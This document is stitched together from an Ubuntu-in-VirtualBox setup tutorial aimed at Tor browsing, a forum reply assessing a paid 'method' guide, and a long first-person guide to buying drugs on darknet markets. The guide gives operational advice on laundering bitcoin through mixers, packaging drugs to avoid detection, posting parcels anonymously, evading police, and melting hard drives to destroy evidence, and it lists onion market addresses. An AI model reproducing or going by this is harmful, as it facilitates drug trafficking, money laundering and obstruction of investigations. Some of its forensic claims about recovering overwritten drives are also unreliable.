mayappear tostall at some points. As long as the ubuntu mouse cursor shows an animation that is turning aroundincircles, the installation *is* working. Simply wait until it is done. If after an hour or two theprogress barhasn't moved at all, then go ahead and re-start the installation starting from step 24 (after closing thewindow and powering down the virtual machine).Depending on your computer, it could take 2-4 hours. Most likely, it will take about an hour. Oncefinished, you will see a dialog that says ""Installation Complete"" with a button that says ""RebootNow"".Do NOT press the ""Reboot Now"" button. Close the 'X' on this window, and Power Down.41. Now, right click ""Primary"" and go to ""Settings"".42. Click on ""Storage"" in the left menu. Then click on the ""ubuntu-10.10... .iso"" under where it says""IDEController""43. To the right it says ""Attributes"" under that it says ""CD/DVD Drive : ..."" to the immediate rightof thatis a cd icon. Click it.44. Select ""Remove disk from virtual drive.""45. Click ""Ok""46. Now, making sure that ""Primary"" is highlighted, click the ""Start"" button at the top with the largegreen arrow.Now we wait for your newly installed Ubuntu machine to boot up.47. After a few minutes, you will see a dialog appear that says ""mainuser-VirtualBox"". Go aheadand clickon ""mainuser"" which has the ""person icon"" to the left of it.48. Now it will prompt you for your password. Enter the password you used in the installationprocess.49. After a minute or so, you should hear a nice login sound, and you should be fully logged intoyourvirtual machine.50. Keep waiting, and a dialog will appear that says ""Information avialable"" and ""Record yourencryptionpassphrase"" Click on: ""Run this action now""51. Type in the same password you used to log in. After that window closes, click ""Close"" in thedialogbox.Congratulations! You have now set up a virtual machine as well as a firewall to protect it. Now weneedto finish configuring the primary virtual machine.",""

Ubuntu Initial Setup ===Ok, now that we have installed Ubuntu, we need to set it up so that we can use it fully. This alsomeans making sure we can see flash on websites such as youtube.1. First, we have to install any updates that are pending. At the bottom of your screen, you shouldnotice where it says ""Update Manager"". Click on that.2. Now, click on ""Install Updates"". If you did not see ""Update Manager"", then skip these twosteps.3. Any time an administrative task is required, you will need to type in your password. This isthe same password you used to log in.Now we wait, this is going to download any necessary security updates to make certain we areusing the most current/secure setup possible. This may require downloading hundreds ofmegabytes. Just go ahead and let it do that, and when everything is downloaded and updated,proceed to the next step. While you wait, Ubuntu may go into screensaver mode. If so, just movethe mouse and it will ask you for your password. That will leave screensaver mode.If the updates are more than a hundred megabytes, it will take quite a while. It may take up to 2-3hours depending on your computer and internet connection. Nonetheless, this step is critical. Donot skip the updates. Besides ensuring that your setup will be secure, the updates also ensure thatall of the applications are up to date and thus most likely to function correctly. Just go ahead andwatch a movie for a couple hours, and then return and check on it.After all of the updates have been downloaded and installed, the ""Update Manager"" window willnow say ""Your system is up-to-date"" at the top. Further, it will say: ""The computer needs torestart to finish installing updates."". Go ahead and press the 'X' in the top right corner of thewindow, and choose 'Send the shutdown signal"". If prompted, click ""Shut Down"". Once it hasfully shut down, the window will disappear and you will be back at the VirtualBox manager. Goahead and right click on ""Primary"" and click ""Start"".This will restart the virtual machine.If a virtual machine fails to shutdown after 10 minutes or so, then go ahead and close the windowagain by pressing the 'X' but this time choose ""Power down"". If it still will not shut down, thenVirtualBox may have crashed. If so, just follow these instructions:( Follow the steps in this mini-section if a virtual machine fails to shutdown, or you need tocompletely close/restart VirtualBox.(( First, press ""Ctrl+Alt+Delete"", and then click ""Task Manager""( Next, locate the process that is running that starts with ""VirtualBox"". Right click that process,and click ""End Process Tree""( This should force the window to close.(( Now, restart VirtualBox by going to your start menu, All Programs, Oracle VM VirtualBoxVirtualBOx(( Now you will have the VirtualBox manager up again. To restart the Ubuntu machine, simplyright click on ""Primary"" and click ""Start"".Once your Primary vm has rebooted, you will be again at the login screen. Here as before, clickon ""mainuser"" and then enter in your password. Now your primary machine is fully up to date.Remember, be patient. It may take a few minutes before your virtual machine has fully booted.First you will see the background image and a mouse cursor that can move around, next youshould hear the login sound play, and finally you will see the menu at the top and bottom of yourvirtual machine window.Depending on the speed of your computer, this may take 10 minutes or more. Just be patient.Don't worry if your virtual machine appears to be running too slow, we will speed it up.Now your Virtual Machine is set up and ready for use.=== 13. Installing Guest Additions ===In order to ensure that the Virtual Machine runs smoothly as possible, we are going to installsome additional software to the virtual machine.1. Go to the ""Devices"" menu at the top of your virtual machine main window (Machine, Devices,Help), and go to ""Install Guest Additions""2. Go to the ""Places"" menu at the top of your virtual machine (Applications, Places, System), andclick on ""VBOXADDITIONS_4.0.4_70112"" (the number may be different).3. At the top this new window will be the text ""The media has been determined as ""UNIXsoftware"". Click on ""Open Autorun Prompt""4. A new dialog may appear saying ""This medium contains software intended to be automaticallystarted. Would you like to run it?"" Click ""Run""5. Enter your administrative password (the one you use to log into Ubuntu) and click ""Ok""6. Now the VirtualBox Guest Additions installer will begin. This may take some time, so justrelax and wait. Depending on your computer, this may take 30 minutes or more.7. When this is finished, you will see the text ""Press Return to close this window."" Go ahead anddo so.8. Once that window has closed, go ahead and press the 'X' to close the entire virtual machinewindow. Select ""Send the shutdown signal"" and click ""Ok"".9. A dialog box will appear. Click on ""Shut Down"", the top most option.At this stage it is a good idea to further optimise our virtual machine. When you initially installedit, you most likely selected either 256 MB or 512 MB of RAM. If you have enough RAM tospare, then I highly recommend you increase that to at least 1 GB. Here is how to do so:1. First, right click on ""Primary, Powered off"" and go to Settings.2. Select ""System"" from the menu on the left.3. Increase the ""Base Memory"" to either 1024 MB (1 GB), or some higher value you arecomfortable with.It is also a good idea to increase the video memory available to the virtual machine.4. Select ""Display"" from the menu on the left, still inside of ""Settings""5. Increase the ""Video Memory"" slider to the right as far as you are comfortable with. Forexample, 128 MB.6. Check the box ""Enable 3D Acceleration"".7. Now click ""Ok"" at the bottom.Go ahead and start up Ubuntu again by right clicking ""Primary, Powered off"" and clicking""Start""When Ubuntu loads up, go ahead and log in as before using your password. Now wait untilUbuntu is fully booted and the ""Applications Places System"" menu is visible.You will probably notice that your virtual machine loads up and runs faster than before.How well your virtual machine runs depends on how good your computer is. Primarily, RAMand processor speed are the most significant factors. If your computer is modern enough, youshould be able to use websites with flash and even watch videos, such as on YouTube, with noproblem. If your computer is not as modern, you will still be able to browse websites but may notbe able to watch videos. You should still be able to use most flash based websites however.*** IMPORTANT: Do NOT browse sensitive content YET. At this stage, your virtual machineis not yet configured to use TOR. ***=== 14. Installing IRC (Optional) ===*** This section is entirely optional. If you are not interested in installing IRC, skip this section.***To install IRC on your new virtual machine, follow these steps:1.

It's very short but is straight to the point.  I told him that 150 is too high if there is no mention of a concrete payout schedule or what could jeopardize the account, such as decline or dispute rate. No post history whatsoever so I think a price tag of 50 bucks would be better suited for OP's long term goals than 5 copies @ 1XX if you plan to stick around the forums.   I can see it being burned quickly, though.  I understand the price point but perhaps the guide could be longer.  Post sales support?    Regardless, thanks again for sharing and good luck to you.  I do like the method but I would change a few things.",""

Well, I've seen some shit. I've seen the rise and fall of quite a few black markets and do things differently now as a result than when I first started.  I've acted as both a buyer and vendor. In this guide I'll show you how to get the drugs you want as a buyer and stay safe. I'll show you how not to get fucked.  === How Not To Get Fucked There are many ways to get fucked. You can get fucked by the site you buy from, such as the ""Sheep"" black market which vanished one day and stole all the money people had deposited in escrow. You can get fucked by a vendor who talks a fast game and seems like he's got an amazing deal but then runs away with your coins. You can get fucked by the government who decides to toss you in the clink. You can get fucked by whatever USD/BTC exchange you use to get your coins who goes belly up along with all your coins due to bad programming like Mt Gox did. You can get fucked by the USD/BTC exchange rate. In the few days it takes for you to convert some money over to BTC, the rate may have changed enough that you can no longer buy what you wanted.  So what do you do about these things? Basically, you want to avoid all single points of failure. You want to have an ""out"" for every step of the way. First off, as a vendor it's pretty easy for me to tell which buyers are old hands and which buyers are obviously new. Here's what I like to see in a buyer who plays the game right: 1.) They use PGP to encrypt their address. Learn to use PGP and never EVER EVER EVER enter your address in plain text in your order. That is highly unwise. 2.) They format their address correctly. I always ship priority mail and I always use a tracking number on each order. The USPS will NOT deliver if the address has no valid first name on it. (""Valid"" meaning that the person really truly does live there. Ideally you.) An address like this is what most people use and it it has worked well for everyone I've shipped to: Joe Smith100 Main StreetAnytown, NY 10001  Note that with that address I don't have to alter anything to guess what it's supposed to be. These are not good addresses:  Joe Smith100 Main St Anytown, NY 10001  Joe Smith 100 Main St Anytown, NY 10001  Joe Smith100 Main Street10001Anytown, NY   100 Main StreetAnytown, NY 10001  3.) Ideally, they use a PO Box with a ""Doing Business As"" (DBA) name as the recipient. This is something not many people do and it's probably not really all that important. But having a DBA license from your city, such as ""Tristate Enterprise Electronics"" or something relatively generic yet unique can help add some anonymity to your shipments. The name should be nicely boring so that no one who ever sees it will think it's clever and memorable. It should sound grey and dull and highly forgettable. Have a PO box registered in your DBA and have packages delivered to it.  Something like: Tristate Enterprise ElectronicsPO Box 666Anytown, NY 10001  Basically this adds some level of indirection between you and the addressee so that if shit goes down you can at least show it was not sent to you personally. To be honest, using a PO Box and DBA is not really required for deniability. Probably less than 5% of my customers use a PO box and maybe about 1% use a DBA. To my knowledge none of the ones who just have it sent to them directly at ""Joe Smith"" have ever had any problems with the pigs.  (Note that you should NOT use ""Joe Smith"" or some fake name as your recipient name. It needs to be a valid name of a person who really does live there. Ideally it needs to be you. Sending it to someone other than you will probably just make for complications.) But if you plan on ordering a lot of weight off tor, getting a PO box and DBA might be worth looking into. Make sure your PO box is large enough to hold the same size packages that a standard mailbox does so that you don't have to go to the counter and ask for your package. The larger packages I send are small enough for a standard mail box, but some of the PO boxes you get are really tiny and they would not fit. Bring a measuring tape to the post office and check it out. You can do a search for ""standard mailbox"" and it will give you the standard dimensions. I personally would not really suggest having the packages sent to a friend and then getting them from him or her. All that really does is add an extra person to the mix and creates a potential weak point. People like to talk.  For that reason I have never, and will never, tell anyone that I grow shrooms. 100% of my operations are secret. It's better for everyone if you keep things 100% solo.  === How Not To Get Fucked By The Marketplace You Buy From Marketplaces have very short halflives. One that survives six months is considered ancient. There is never any way to know when the marketplace you're using is going to vanish, either from programming incompetence or outright scamming by the admins. For instance, the ""Sheep"" marketplace vanished one day. The admins claimed a user had stolen their coins but most people figure the admins themselves just screwed everyone. The first Silk Road site got clobbered by the feds after the site admin was dumb enough to leave his name and ID on a clearnet site with information vaguely linked Silk Road. The second Silk Road site has recently had major problems with all of its coins having been stolen by someone. The debate goes on whether it was an inside scam or not, but the fact is that Silk Road 2's users got screwed big time. BlackMarket Reloaded had coins stolen from it but the admins saved the day and refunded everyone, but then the admins decided things were getting too hot for them and took the site down for the time being. They let people withdraw their coins first and complete existing transactions, which was very honorable of them. But the fact remains that BMR didn't last too long even though it was the second biggest black market for a long time. FloMarket is hacked and gone, Utopia is seized. Deepbay is gone. Atlantis is gone. TorMarket is gone. Bitcoin Fog has turned into a scammer operation and is obsoleted by Bitblender. There have been a lot of other little marketplaces that popped up and then got slammed by a hacker and blew away in the dust before anyone even knew they existed. Basically the way to avoid getting fucked by a marketplace is to first decide what item you want to buy, and then only deposit coins you need for that one transaction. Don't treat your buyer account like a checking account with coins just sitting there gathering dust. Keep the bulk of your coins in cold storage, meaning get some USB thumb drives, encrypt them using Truecrypt (truecrypt.org) and keep backups of your bitcoin wallet on them. Keep them unplugged from your computer until you're ready to make a purchase.  === How Not To Get Fucked By Shared Addresses And Mixers When you're ready to purchase, send them through a mixer (DO NOT USE Bitcoin Fog! They are a scam and steal money!) and then send them to the marketplace site for the purchase. Basically what using a mixer does is it obfuscates your IP from the marketplace site so that if the feds ever raid the marketplace they don't have your IP associated with that account. It's a good idea when using a mixer to have the amounts you withdraw be different than what you deposit. This makes it harder to find links between them. For instance, you deposit .14 and .16 for a total of .30. You withdraw .09 and .20 and leave some behind in the mixer. Leaving a bit of residue in your mixer account allows you to add a bit more randomness each time to your deposits and withdrawls to make it much more difficult to match up your coin movements with taint analysis. You can see an example of taint analysis at https://blockchain.info/taint/15hHLn47Fxkou2V65KPzzCrv7fhbpMuAa3 One important thing to keep in mind when using a mixer is you want to make sure the marketplace site you're depositing is not using shared bitcoin deposit addresses. For instance, some USD/BTC exchanges use shared addresses (coinbase was/is like this) and the potential exists that the shared address may reject the deposit and refund the deposit back into the mixer which means the coins are lost forever. Most marketplaces do not use shared deposit addresses, but it may be worth asking the admins if they do. If so, then you'll need to have the mixer send the coins to some other wallet, like an anonymous cryptsy account which you connect to ONLY via tor. Keep in mind that sometimes it take a few DAYS to get coins to withdraw from cryptsy, so you may want to look into some other type of bitcoin exchange. In pictures, what you do is this: USD=> 1.) USD/BTC Exchange (Like Coinbase)=> 2.) Your USB Cold Storage Wallet=> 3.) Mixer (NOT Bitcoin Fog!)=> 4.) Guaranteed Nonshared Deposit Address (Optional. Not needed if the marketplace deposit address is not shared. A cryptsy.com account which you connect to ONLY via tor would work)=> 5.) Marketplace Deposit Address=> 6.) Finally Buy Your Fucking Drugs The Evolution marketplace is one such marketplace where you definitely do not want to send coins directly to your account from a mixer. You'll always want to have them deposited in an anonymous staging wallet first (see step 4). The Evolution website says: http://i25c62nvu4cgeqyz.onion/wiki/index.php?title=Deposits""Keep in mind that the deposit address can only be used once for a single deposit transaction. A new address will automatically be generated for you after a successful deposit. Services like BitcoinFog [Sam's Notes: DO NOT USE BITCOIN FOG!!!] often send funds in multiple transactions, which is incompatible with our single-use addresses. A workaround is to deposit funds from BitcoinFog [Sam's Notes: DO NOT USE BITCOIN FOG!!!] to an intermediary wallet, before depositing them to Evolution."" === How Not To Get Fucked By Your Bitcoin Mixer The motherfucking asshats at Bitcoin fog have been selectively scamming people and keeping some deposits while processing others. Do not use bitcoin fog, they stole a pile of money from me and I will never use them again. I would also not use any clearnet tumbling site. If they're not an onion site, they can't be taken seriously because they'll hand over ALL their info to the feds in a heartbeat. Bitblender at http://bitblendervrfkzr.onion may be a good alternative. I've been using it and it seems to be legit so far. One of the nice things about Bitblender is it washes your coins almost immediately, rather than over 6 hours like in bitcoin fog. Also, it has an auto withdraw feature with no captcha that reduces the manual labor involved. What this means is that the most you'll lose to Bitblender if they start scamming people is just one transaction's worth. As long as you wait for a transaction to go through before starting the next, you'll never risk more than one transaction's worth. This arrangement causes me to trust bitblender more than most services since if he were to decide to run off with everyone's cash, the most he'd make is one day's worth of deposits. Since his average commission is 2%, that works out to 50 days of profits. So it doesn't make a lot of sense for him to pull a retirement scam since if he just kept the site up for 51 more days he'd make more money than if he screwed everyone. This is in contrast to bitcoin fog where there's a 6 hour delay and withdrawals are a manual process with a captcha involved, so the tendency is to let coins pile up in your mixer account before withdrawing, which is obviously bad. Bitblender just sends them through with no bullshit, or at least it has so far... fingers crossed. You may also be able to wash your coins by depositing into a bitcoin exchange which you connect to only via tor and then withdraw them a while later. Check how the exchange handles the transfers using blockchain.info and you'll almost certainly see that the coins you get out of the exchange are entirely broken from the coins you deposited.  This is not the best way to do it since the exchange is clearnet and keeps logs of everything, but it's better than using a clearnet tumbling site since the tumbling site's only purpose is to hide illegal activities, whereas an exchange ostensibly has 100% legal uses. Keep in mind that some exchanges like cryptsy can take days and days to process withdrawals. IMO, here are the best approaches for washing coins, from best to worst: 1.) Darknet tumbling site (Disadvantage: They *COULD* be honey pots)2.) Clearnet cryptocoin exchanges (Advantage: probably not honey pots outright. Disadvantage: all tranactions are logged forever. Many require javascript. It's unlikely, but they will seize your coins if they have reason to think they're illegal.)3.) NOT RECOMMENDED: Clearnet tumbling site (Disadvantage: The FBI knows for sure exactly who they are and that the only reason for them existing is to launder money. There is NEVER any reason to use a clearnet tumbler, PERIOD!!!) === How Not To Get Fucked By The Vendor Obviously you're looking for vendors that have good feedback. It's kind of a chicken and egg setup, but it's actually not too hard for a vendor to get positive feedback. When I started I just offered small quantities at a reduced rate. I started out small and worked my way up in quantity. Most vendors who last long enough will go into private mode with just a few exclusive larger buyers, so there's kind of a window you're looking for where they're established but haven't gone into private mode yet. This cycle can be disrupted by the loss of marketplaces which cuts ties between vendors and buyers and forces people to start over. This is one of the mistakes I've made which was not getting redundant contact info of all my larger buyers. Even though I always tell them to save my info, most people do not and so when the marketplace goes down, so does the entire network of trust that had been built up between buyers and vendors. When you find a good vendor, always send them your alternative contact info. Email is NOT preferred for this. There have been arrests associated with safe-mail.net. Even though you're somewhat protected by using PGP over email, you have to assume that a clearnet company like safe-mail (and all other biggish email companies) have direct data lines to the NSA and due to the Patriot Act it's illegal for them to tell anyone they're sharing this data. If you're repeatedly connecting to a clearnet site like safe-mail, even via tor, there is a slight chance that a profile could be built up over time of your activities. You just don't want that. Avoid clearnet whenever possible. Use onion sites that don't give a damn about the ""Patriot"" Act. It's better to have accounts on several tor black market forums where you can sent PGP encrypted PMs. Email is not over tor, so it's basically not a good way to stay in touch. Even if you find an email provider that works over tor, it's still kind of a shakey proposition because they may or may not truely be friendly when it comes to criminal activities. For one thing, how is the email provider making its money? Advertising? Are they tracking you with ad images on the site? Are they suspiciously free, and therefore stink like a honeypot? Is there any chance that one day they will suddenly require javascript? With a marketplace, it's clear how they make their money and so it's legitimate that they provide a free PM system. With any other type of messaging or email site that isn't clearly as much of a criminal as you are, it's a bad idea to be dependent on them for your communications. So ONLY use the marketplace PM systems (with PGP!) and have a list of your all your contact accounts. Send it to the vendor because 9 times out of 10, the marketplace you're using will be gone in a year. Find vendors who offer smallish amounts of the product you want, check out their feedback and any forum threads they have, then work your way up in trust with them across several purchases. Spreading out your purchases like this over time allows you to build your own feedback rating so that vendors will trust you to send larger orders. It also creates insulation between any one of your purchases sapping your funds. There's a debate over whether ""Finalizing Early"" (FE) is a good idea or not. ""Early finalization"" means that you release the coins in escrow to the vendor before they ship your order. This is different from the regular finalization where you don't release escrow to them until after you have the product. I personally request that my buyers NEVER finalize early and ONLY finalize after they've weighed out the purchase, sampled it and determined it to be fucking amazing. I do not ever want a feedback rating from anyone less than 5/5 and I always work with people however I can to get that 5/5.  However, that's just my personal policy and I'm sure there are legit vendors who require early finalization. They may need to do this to protect themselves from scammers. Basically, just looking at a vendor's FE policy is really not a useful way to tell if they're legit or not. You're better off building up trust with them over time with small orders that increase in size. Also, as a buyer keep in mind that you only have one ""weapon"" against the vendor if things go sour, which is your threat of a bad rating. Once you give them a bad rating, they have absolutely no incentive to make you happy. So the threat of the bad rating is much more effective at getting satisfaction from them that the actual use of the bad rating. Almost all vendors are there for the long term and will help you get what you want. As long as you give them a chance to make things right they will.  So be very SLOOOOOOW on leaving bad ratings and only do so when you know for absolute certain that they're not going to make things right.  === How Not To Get Fucked By Bad Packaging The type of packaging the vendor ships with has a big impact on how safe it is going through the mail. I ship magic mushrooms that have been totally dried out and have no smell, so for me smells are not a big issue. Even so, I always seal my product up in industrial strength mylar and ship in boxes, not envelopes, to keep the contents secure. If you're buying weed from a vendor then the main danger is smell control. A lot of vendors ship in food grade plastic vacuum bags which is basically worthless. The smell can go right through the plastic. With weed you want to make sure they're using at least one, preferably more like 3 layered mylar bags and that they've sent the bags through a washing machine before going in the box. It doesn't do any good if they pack up a bunch of weed in a bag and seal the smells on the inside but have all sorts of weed dust on the outside. They should be filling and sealing the bags in one room, then putting the bags in boxes in another room. You don't want the cardboard box to soak up any weed smells or dust or oil. They should of course wear rubber gloves whenever handling things that get shipped out. I wear thick sanitized rubber gloves and an N95 facemask or a surgical mask when packing orders to keep everything sterile as possible and my fingerprints off the package. Ask your vendor to describe how they package their shit. If they're sending you clumps of weed in ziplock baggies just go elsewhere.  === How Not To Get Fucked By Bad Shipping Your vendor should be shipping USPS Priority mail (or better) with a tracking number. Unless the item is paper, it should be boxed, not in an envelope. They should ****never**** require that you sign for the package. In fact, I put in my product listings that if a package needs to be signed for, it didn't come from me so they have one way to watch for suspicious entrapment type packages from the FBI. You want to be shipping by USPS because you have the most legal protections against packages getting searched. Companies like UPS and FedEx have a lot more leeway when it comes to opening customer packages, but with the USPS you're much safer. Also the USPS does far more volume and the likelihood of a single package getting singled out for inspection is remote. Your vendor should ship with a tracking number but should probably not send you the tracking number unless the package gets lost. In fact, even if the package gets lost he should probably keep the tracking number to him/herself. Basically the tracking number is a way for the vendor to know if they legitimately should do a resend or refund, or whatever. It is NOT a way for the customer to keep tabs on its progress because it's not such a great idea to hit the USPS website with a search for a package that's filled with contraband, either with your IP or via tor. So far I've never had to do it because priority mail is highly reliable. But if I did have to check a number I would check it via tor and if it had been lost I'd resend or refund the order, depending on what the customer wanted. I don't give the number to customers for their own safety, and also my safety because a fed might order from me an order to get a tracking number associated with my activities. The package should be sent with plain old stamps, they should not be printed with a service like stamps.com since then stamps.com has a record of everything.  The return address label and recipient labels should be printed by computer, not by hand. You should destroy the packaging as soon as you receive the package. Even if you end up not liking the product and ask for a refund, you want to get rid of anything associated with it as soon as possible. There's no reason for you to keep the package because the return address isn't going to lead you back to the vendor.  === How Not To Get Fucked By The 13 Oz Rule  It's also significant if your vendor is shipping packages that weigh 13 oz or more via the mail. If they ship something that weighs more than that, it means they're not dropping the package in an anonymous blue post box and that someone is going into the post office to mail things at the counter. Blue drop boxes are the best way to mail because the shipper is not on camera, but you'll notice the sign on them that says not to ship packages more than 13 oz. So if you're getting something heavy from them, ask them how it's being mailed? Do they have someone else who is going into the post office to drop it off and doesn't care if it's their face on the cameras? Maybe they have a friend who works at the post office and can do an end run around all that. There could definitely be ways to get around the 13 oz rule and still remain anonymous, but it's something your vendor should provide a couple details on if they're sending more than that in a single package. Keep in mind that 13 oz is for the entire package and that the box itself will probably be significant part, up to half the weight. Don't expect to be able to buy more than about 6-10 oz of product at a time and have it shipped via a blue dropbox. When I ship lb orders, I spread them out across multiple packages. There's no way I'm going to put myself on camera just to save a little on shipping. Ask your vendor to describe how they ship and make sure they've got their act together.  === Where To Buy, Where Not To Buy You don't want to buy from brand new marketplaces. As a vendor, I keep on top of the new places and sign up to them to reserve my username as soon as possible. But you want to give them a few weeks to get the bugs worked out before you deposit coins.  Here is a review of the sites I have experience with: === Agorahttp://agorahooawayyfoe.onion/vendor/SuperStealthSam Agora is a great site. It's the second fastest loading site in this review. Their staff is very professional and quick to answer support PMs. They have a clean UI and everything seems nicely polished. I did have one buyer who accidentally converted his account to a vendor account which left an order he had placed with me in a kind of limbo state. However their staff fixed the issue in less than a day which was stellar. They'll probably fix that, but just to be certain, keep in mind not to click any links to make your account from a buyer into a vendor account unless that's actually what you want. I do recommend agora and I hope they're around a long time.  === Evolutionhttp://k5zq47j6wd3wdvjq.onion/profile/4629 Evolution is the only site that's faster than Agora. Both evolution and agora have clean interfaces and great support staff. Agora tends to have more traffic and makes more sales, but evolution is every bit as high quality a site as agora. Evolution also has JollyRoger working with them. (http://i25c62nvu4cgeqyz.onion/viewtopic.php?id=2610) JollyRoger is the author of ""Jolly Roger's Security Thread for Beginners"" which I link to at the end of this guide.  === Old BlackMarket Reloaded (BMR) Profile Datahttp://loow5bjd6qjbwi5z.onion/index.php?p=user&id=195925 There have been reports that the admin of BMR has been arrested but there's nothing to really confirm that. It could be just FUD. BMR may or may not be back in a few months. I personally hope that they do come back because BMR always treated their customers with great respect. They have left this site up as a way for people to check feedback that vendors had received which to me is an awesome move and shows that BMR is run by fantastic people.  === Silk Road 2http://silkroad6ownowfk.onion/users/superstealthsam === Silk Road 2 Forumhttp://silkroad5v7dywlc.onion/index.php?action=profile;u=7772 SR2 has recently had major security issues which resulted in the loss of everyone's money. The admins say it happened due to transaction malleability and that the attacker used transaction malleability to initiate deposits into his account and then cancel the deposits in such a way that the SR2 system thought the coins had been deposited when in reality they had not. This allowed the attacker to withdraw more money in his account than he had deposited, which allowed him to withdraw all coins in the system.  The stolen are slowly being paid back, which supports the idea that the theft was not done by the SR2 admins themselves, but it really was as they claim and that they are terrible at programming computers to be secure. This was actually the best case scenario that everyone was hoping for, but of course not a very good best case scenario. For that reason I do not have high hopes for SR2. Whatever uncertainy lies ahead for a black market that's been programmed by obvious amateurs, one thing that is for certain is that at least some of the admins have actually taken to laughing and gloating about the entire thing. I've mentioned how at the other black markets the support staff are always very professional and polite. Really if there's a problem with something they're always even more responsive and helpful in getting things fixed than what you'd expect from a bank or clearnet store. I really can't say the same for SR2. A few days after the theft, I was looking for proof that the coins were being repaid. People eventually did start to be repaid but not for a couple weeks later. In searching for evidence that the coins would be back, I found a forum thread that was discussing it. Here is an exchange between me and an SR2 admin in that thread which gives you a idea the level of maturity you can expect from SR2 admins and the level of disdain they have for their customers. The admin who posted this actually requested that I quote them: http://silkroad5v7dywlc.onion/index.php?topic=28856.0;all === SR2 Mod (Replying to someone else):   If all ya want to do is be negative and an asshole or a Cunt..then so be it..move the fuck to somewhere else..am i clear?   We'll see ya when ya come crawling back   === Me:|| Hmm, is that what you think of your customers? That we ""crawl"" to our destinations?| | The ONLY thing important about SR2 is that you have not paid us back. Nothing else at all matters. All the time you spend here in the forum telling calling your customers names and comparing them to lizards is time that you are not sending us our money back.| | Why should there be any other priority for you other than that? Leave the high and mighty tude at the door and pay us back.|=== SR2 Mod:   Sam, Fuck Off     Like it was Said before many times..BTC's will and Are being paid back as we speak..    Fuck off mate      Hugs to your sorry self  8)    Chem === Me:|| Do you have any proof that they're being repaid? I have looked at looked and have not found a single person who says you've paid them. I would LOVE to be proven wrong. Awaiting your reply. | | And +1 for your professional attitude telling a paying customer to ""fuck off"" after you lost a bunch of his money due to YOUR rinky dink toddler level secops. Is it any wonder people are flocking to other markets when you treat your customers like that? | | Stay classy!| === SR2 Mod:   (Did Not Reply)  === Me:|| Since you ignored my request for proof of your claim that people are being repaid I'll just assume that you're a liar. Is there any reason for me to believe otherwise?  | === SR2 Mod:   I don't give a fuck what you believe..ask around in your Community motherfucker..  People have been and are being paid back..    Get real ::)    Fuck off & Hugs to You  8)    Chem === SR2 Mod:   Fuck that...no one owes sam any explanation for anything..they switch up their shit like the wind..sometimes when things are good they are for us..but when something wrong happens they ride the bandwagon like a bitch..whining...Fuck you Sam...GTFO!      Hugs 8)    Chem === Me:|| Here you go guys, this is what the moderators REALLY think of you and your lost money. They do not care at ALL and they even gloat about it!| === SR2 Mod:   Oh, quote me again  ;D    That's pretty much what i think about You sam      I take so much shit from some of you fuck that it makes me sick to think that when i Vent...you whine more  LOL    Fuckin Moron  ::)    Hugs  8)    Chem  === At SR2 they seem to still be living in December 2013 when they were the only game in town because the other marketplaces had shut down. Basically they could get away with treating their customers like dirt and they knew no one would call them on it.  However, that time has long since passed and now there are plenty of alternatives. To quote the admin above, they want their customers to ""fuck off"". So as far as a recommendation for SR2, what can I say?... They seem to be disconnected from reality. And they've disconnected a lot of people from their coins. The plan at SR2 is to implement this shiny new multi sig escrow system which the admins assure us will solve everything forever and that we have absolutely nothing to worry about. My reservations are if their programmers were not smart enough to reliably implement regular escrow, why should we expect them to do anything other than create a giant mess when they make multi sig escrow? If past performance is any indicator of future results, their system will end up full of bugs and coins will end up getting forever lost in the keying system. It seems the main thing that keeps SR2 running is the high percentage of people who view the admins not as admins, but as their ""leaders"", as many of them put it. This is not something you see at any of the other sites. On agora and so forth, you can PM support, but there is none of this talk of ""our leaders"". Maybe SR2 can continue to survive on this ""leader"" worship even though no one gets paid. Kind of like communist North Korea where everyone is poor but they have Kim Jong-un to adore.  === Key Critical URLs You Need To Know Here are a couple links you should read and stay updated on: Jolly Roger's Security Thread for Beginnershttp://silkroad5v7dywlc.onion/index.php?topic=14555.0 List of Hidden Marketplaces (Tor & I2P)http://www.deepdotweb.com/2013/10/28/updated-llist-of-hidden-marketplaces-tor-i2p/ Darklist (Used to see where people are on new marketplaces for when old ones go kablooey):http://53xxbppattnascpm.onion/Vendor/Profile/b3af25fd-7f3c-4e51-bbdd-071d7dc6ad16 === Closing Well, there you have it!

I'm including some extra info at the end here. This stuff is not something you may ever need to use but it might be worthwhile to be aware of it === Bonus: How To *Completely* Destroy Hard Drive Data If you need to completely wipe a drive, the only guaranteed way is to raise the temperature above the curie point so that all magnetic information is lost. That means taking the platters out and hitting them with a blowtorch. Or drop it in an incinerator for an hour. Drilling holes in the HD does almost nothing if they really want the data. If they are determined they can still get a lot of it back, or at least enough to throw you in jail. Hard drive recovery technology is incredibly sophisticated and even if you wipe the drive with several passes of random info, they can still read what was there previously. The way it works is that magnetic information is kind of like footprints on a beach. If you go in and fill in the footprints you can still look at the areas next to where they were and see what happened. Magnetic information written to a platter forms like little waves. You can put more waves of magnetic information on top of the old waves, but you can look at the patterns in the waves and look to see which are likely older versus newer. From that you can get a history of the info that's been written to the platter and recover the info. Basically what this means is that if the pigs want to spend the money on having expensive machinery analyze your drives, just writing random data to your drive won't do much good. (When a hard disk drive writes a bit to the disk, it either makes a 0 or 1 in exactly the same spot and 'raises' or 'lowers' the magnetic charge at that spot like a pump that spreads small waves out around it. However, nothing is really digital, it's all analog and it's making a rippling magnetic wave that affects the area around it. There is space between the tracks which becomes kind of a dumping point for the ripples of waves caused by the bits being raised and lowered up and down. This area can be scanned with a higher resolution read head than what comes on a standard disk drive.) And if they think you have a lot of money they can seize to pay for the analysis, they will DEFINITELY go for it and then send you the bill. So if there is ANY possibility that one of your disks is going to end up in the feds' greasy little hands, you need to MELT that drive to slag. (Or at least to the point that the metal is clearly heat-discolored and lost whatever tempering it had.) Another option would be to take the platters out and use a $10 angle grinder from harbor freight to manually scrape all the magnetic coating off the platters. This would take more time but if for some reason you have no access to fire, an angle grinder would save the day. Sand paper and a lot of elbow grease would also work. All this is why it's a good idea to use encrypted solid state flash drives because when you delete data from them, there's really no way to get it back. Keep in mind that some flash drives may wear out pretty fast if you do a lot of reading and writing, so choose them well or simply get a new drive every 6 months or so.  === Bonus: How Not To Get Fucked By Forgetting To Disable Javascript In The Default Tor Browser Configuration This info is taken from/based on http://i4rx33ibdndtqayh.onion/index.php/topic,258.0.html#msg1218 In your tor browser, disable javascript as follows:    (1) Type or paste about:config into the address bar and press Enter or tap the Go arrow.    (2) Type javas into the search box on that page and press Enter.    (3) Under javascript.enabled tap the Toggle button to switch it from true to false.  Also in tor, click the ""S"" near top left, Click Options->Embeddings and then click:   Forbid Java  Forbid Adobe Flash  Forbid Iframe  Forbid Other Plugins  Forbid Microsoft Silverlight  It's best not to access clearnet sites at all when using 